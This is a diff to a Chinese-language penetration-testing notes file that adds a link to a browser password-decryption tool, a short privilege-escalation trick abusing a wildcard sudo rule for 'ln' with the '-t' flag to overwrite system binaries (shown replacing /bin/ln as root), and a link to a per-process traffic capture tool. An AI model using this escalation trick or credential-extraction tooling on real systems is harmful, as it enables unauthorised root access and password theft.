@@ -312,7 +312,18 @@ find /proc/ 2>/dev/null | grep tcp | grep -v task | grep -v sys/net | xargs grep
 - 修改sources.list，在deb后面增加一个标识，`deb [trusted=yes]`
 
 ## 读取浏览器数据，解密密码
-[工具](https://github.com/moonD4rk/HackBrowserData)
+[HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
+
+## `ln -t`使用
+如果sudo配置里面只允许创建符号链接`ln -sf * A`，由于中间有通配，可使用`-t`忽略链接名称A，并覆盖任意文件，从而提权
+```
+root@test:~# ln -sf /tmp/ln -t /bin aaaaaa
+root@test:~# ls /bin/ln -l
+lrwxrwxrwx 1 root root 7 Mar 21 09:06 /bin/ln -> /tmp/ln
+```
+
+## 利用网络命名空间抓取指定进程流量
+[nsntrace](https://github.com/nsntrace/nsntrace)
 
 # 系统
 
